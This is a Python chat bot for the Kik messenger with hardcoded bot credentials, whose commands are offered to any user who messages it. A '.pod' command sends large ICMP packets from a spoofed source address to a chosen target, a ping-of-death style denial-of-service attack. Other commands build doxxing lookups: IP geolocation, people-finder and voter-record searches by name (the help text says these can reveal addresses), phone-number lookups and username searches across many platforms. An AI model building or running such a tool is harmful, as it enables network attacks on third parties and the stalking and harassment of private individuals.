#!/usr/bin/env python3
import logging
import sys

import kik_unofficial.datatypes.xmpp.chatting as chatting
from kik_unofficial.client import KikClient
from kik_unofficial.callbacks import KikClientCallback
from kik_unofficial.datatypes.xmpp.errors import SignUpError, LoginError
from kik_unofficial.datatypes.xmpp.roster import FetchRosterResponse, PeersInfoResponse
from kik_unofficial.datatypes.xmpp.sign_up import RegisterResponse, UsernameUniquenessResponse
from kik_unofficial.datatypes.xmpp.login import LoginResponse, ConnectionFailedResponse
import pyshorteners, requests
from scapy.all import *
from scapy.layers.inet import IP, ICMP

listfr = ['a', 'b', 'c', 'd', 'e', 'f']
listfn = ['0', '1', '2', '3', '4', '5', '6', '7', '8']

x = ''.join(random.choice(listfn + listfr) for _ in range(32))
y = ''.join(random.choice(listfn + listfr) for _ in range(16))
device_id = x
android_id = y

username = "testing_x1"
password = "555555"


def main():
    # set up logging
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    stream_handler = logging.StreamHandler(sys.stdout)
    stream_handler.setFormatter(logging.Formatter(KikClient.log_format()))
    logger.addHandler(stream_handler)

    # create the bot
    bot = EchoBot()


class EchoBot(KikClientCallback):
    def __init__(self):
        self.client = KikClient(self, username, password, android_id_override=android_id, device_id_override=device_id)

    def on_authenticated(self):
        print("Now I'm Authenticated, let's request roster")
        self.client.request_roster()

    def on_login_ended(self, response: LoginResponse):
        print("Full name: {} {}".format(response.first_name, response.last_name))

    def on_chat_message_received(self, chat_message: chatting.IncomingChatMessage):
        print("[+] '{}' says: {}".format(chat_message.from_jid, chat_message.body))
        prefix = '.'
        if chat_message.body.lower() == prefix + 'help':
            self.client.send_chat_message(chat_message.from_jid,
                                          'The following are the commands and they only work in dms;\n- .pod <source_ip> <target_ip> <message> <number_of_packets> \n- .shorten <url_here> - to shorten a url.\n- .ip <ip_address_here> - ip address lookup.\n- .name <first_name> <last_name> - name lookup (can give address, etc.)\n- .num <10_digit-num here> - phone number lookup.\n- .uname <username> - to check a username across various social platforms.')

        elif chat_message.body.lower().startswith(prefix + 'shorten '):
            shortening = chat_message.body.replace('.shorten ', '')
            try:
                shortened = pyshorteners.Shortener().tinyurl.short(shortening)
                self.client.send_chat_message(chat_message.from_jid, 'Your short url is: ' + shortened)
            except:
                self.client.send_chat_message(chat_message.from_jid,
                                              '''There was an error on trying to shorten the url: b'Error''')

        elif chat_message.body.lower().startswith(prefix + "ip "):
            try:
                ip = chat_message.body[4:].replace(' ', '+')
                url = "http://ip-api.com/json/" + ip + "?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
                response = requests.get(url).json()
                self.client.send_chat_message(chat_message.from_jid,
                                              "IP : " + str(response['query']) + '\n' + "Status: " + str(
                                                  response['status']) + '\n' + "Continent : " + str(
                                                  response['continent']) + '\n' + "Continent Code : " + str(
                                                  response['continentCode']) + '\n' + "Country : " + str(
                                                  response['country']) + '\n' + "Country Code : " + str(
                                                  response['countryCode']) + '\n' + "Region : " + str(
                                                  response['region']) + '\n' + "Region Name : " + str(
                                                  response['regionName']) + '\n' + "City : " + str(
                                                  response['city']) + '\n' + "District : " + str(
                                                  response['district']) + '\n' + "Zip : " + str(
                                                  response['zip']) + '\n' + "Lat : " + str(
                                                  response['lat']) + '\n' + "Lon : " + str(
                                                  response['lon']) + '\n' + "Timezone : " + str(
                                                  response['timezone']) + '\n' + "Offset : " + str(
                                                  response['offset']) + '\n' + "Currency : " + str(
                                                  response['currency']) + '\n' + "ISP : " + str(
                                                  response['isp']) + '\n' + "Org : " + str(
                                                  response['org']) + '\n' + "As : " + str(
                                                  response['as']) + '\n' + "AsName : " + str(
                                                  response['asname']) + '\n' + "ReverseDNS : " + str(
                                                  response['reverse']) + '\n' + "Mobile : " + str(
                                                  response['mobile']) + '\n' + "Proxy : " + str(
                                                  response['proxy']) + '\n' + "Hosting : " + str(response['hosting']))

            except:
                self.client.send_chat_message(chat_message.from_jid, 'Invalid/private ip!')

        elif chat_message.body.lower().startswith(prefix + "name"):
            helping = chat_message.body.split(" ")
            nm = helping[1]
            ls = helping[2]
            self.client.send_chat_message(chat_message.from_jid,
                                          'Lookup for ' + nm + ' ' + ls + ' successful!\nAll possible results:\n\n' + "- Facebook\nhttps://www.facebook.com/search/top/?q=" + nm + "%20" + ls + '\n-\n' + "- Twitter\nhttps://twitter.com/" + nm + ls + "/?lang=en" + '\n-\n' + "- That's them\nhttps://thatsthem.com/name/" + nm + "-" + ls + '\n-\n' + "- Whitepages (US only)\nhttps://www.whitepages.com/name/" + nm + "-" + ls + "\n-\n" + "- True people search\nhttps://www.truepeoplesearch.com/results?name=" + nm + "%20" + ls + '\n-\n' + "- New England Facts\nhttps://newenglandfacts.com/ng/profile/search?fname=" + nm + "&lname=" + ls + '\n-\n' + "- Linkdin\nhttps://www.linkedin.com/in/" + nm + "-" + ls + '\n-\n' + "- Voter Records\nhttps://voterrecords.com/voters/" + nm + "-" + ls)
        elif chat_message.body.lower().startswith(prefix + "num"):
            try:
                phone = chat_message.body.split(" ")
                pnum1 = phone[1]
                pnum2 = phone[2]
                pnum3 = phone[3]
                self.client.send_chat_message(chat_message.from_jid,
                                              'Lookup for +1 (' + pnum1 + ') ' + pnum2 + ' ' + pnum3 + ' successful!\nAll possible results:\n\n' + "- That's them\nhttps://thatsthem.com/phone/" + pnum1 + '-' + pnum2 + '-' + pnum3 + '\n-\n' + "- 411 (US only)\nhttps://www.411.com/phone/" + pnum1 + '-' + pnum2 + '-' + pnum3 + '\n-\n' + "- Sync.me\nhttps://sync.me/search/?number=" + pnum1 + pnum2 + pnum3 + '\n-\n' + "- Truecaller\nhttps://www.truecaller.com/us/" + pnum1 + pnum2 + pnum3 + '\n-\n' + "- US Pb (best)\nhttps://www.usphonebook.com/" + pnum1 + '-' + pnum2 + '-' + pnum3)
            except:
                self.client.send_chat_message(chat_message.from_jid,
                                              'Enter the number like the following example - \n.num 819 910 5585')
        elif chat_message.body.lower().startswith(prefix + "uname"):
            uname_old = chat_message.body.split(" ")
            uname = uname_old[1]
            self.client.send_chat_message(chat_message.from_jid,
                                          'Lookup for ' + uname + ' successful!\nAll possible results:\n\n' + "Twitter:\n" + "https://twitter.com/" + uname + "\nGitHub:\n" + "https://github.com/" + uname + "\nReddit:\n" + "https://www.reddit.com/r/" + uname + "\nReplit:\n" + "https://repl.it/@" + uname + "\nInstagram:\n" + "https://www.instagram.com/" + uname + "\nPinterest:\n" + "https://www.pinterest.de/" + uname + "\nSteam:\n" + "https://steamcommunity.com/id/" + uname + "\nImgur:\n" + "https://imgur.com/user/" + uname + "\nTiktok:\n" + "https://tiktok.com/" + uname + "\nFacebook:\n" + "https://facebook.com/" + uname + "\nTwitch:\n" + "https://twitch.tv/" + uname + "\nSpotify:\n" + "https://spotfy.com/user/" + uname + "\nGoogle plus:\n" + "https://plus.google.com/+" + uname + "\nAbout me:\n" + "https://about.me.com/" + uname + "\nBuzzfeed:\n" + "https://buzzfeed.com/" + uname + "\nYouTube:\n" + "https://youtube.com/" + uname + "\nSoundcloud:\n" + "https://soundcloud.com/" + uname + "\nRoblox:\n" + "https://www.roblox.com/user.aspx?username=" + uname + "\nCashMe:\n" + "https://cash.me/" + uname + "\nEtsy:\n" + "https://www.etsy.com/shop/" + uname + "\nGravatar:\n" + "https://en.gravatar.com/" + uname + "\nCode Academy:\n" + "https://www.codeacademy.com/profiles/" + uname + "\nCloudflare Community:\n" + "https://community.cloudflare.com/u/" + uname + "\nKik:\n" + "https://kik.me/" + uname + "\nMyspace:\n" + "https://myspace.com/" + uname + "\nFortniteTracker:\n" + "https://fortnitetracker.com/profile/all/" + uname + "\nVenmo:\n" + "https://venmo.com/" + uname + "\nCloob:\n" + "https://www.cloob.com/name/" + uname)

        elif chat_message.body.lower().startswith(prefix + 'pod'):
            try:
                pod_split = chat_message.body.split(" ")
                source_ip = pod_split[1]
                target_ip = pod_split[2]
                pod_message = pod_split[3]
                pod_packets = pod_split[4]
                exec_pod = IP(src=source_ip, dst=target_ip) / ICMP() / (pod_message * 65000)
                send(int(pod_packets) * exec_pod)

            except:
                self.client.send_chat_message(chat_message.from_jid,
                                              'Invalid format! Use:\n.pod <source_ip> <target_ip> <message> <number_of_packets>')

        else:
            self.client.send_chat_message(chat_message.from_jid,
                                          '''Command not recognised! Use '.help' for a list of commands.''')

    def on_roster_received(self, response: FetchRosterResponse):
        print("[+] Chat partners:\n" + '\n'.join([str(member) for member in response.peers]))

    def on_friend_attribution(self, response: chatting.IncomingFriendAttribution):
        print("[+] Friend attribution request from " + response.referrer_jid)

    def on_peer_info_received(self, response: PeersInfoResponse):
        print("[+] Peer info: " + str(response.users))

    def on_status_message_received(self, response: chatting.IncomingStatusResponse):
        pass

    def on_username_uniqueness_received(self, response: UsernameUniquenessResponse):
        print("Is {} a unique username? {}".format(response.username, response.unique))

    def on_sign_up_ended(self, response: RegisterResponse):
        print("[+] Registered as " + response.kik_node)

    # Error handling

    def on_connection_failed(self, response: ConnectionFailedResponse):
        print("[-] Connection failed: " + response.message)

    def on_login_error(self, login_error: LoginError):
        if login_error.is_captcha():
            login_error.solve_captcha_wizard(self.client)

    def on_register_error(self, response: SignUpError):
        print("[-] Register error: {}".format(response.message))


if __name__ == '__main__':
    main()
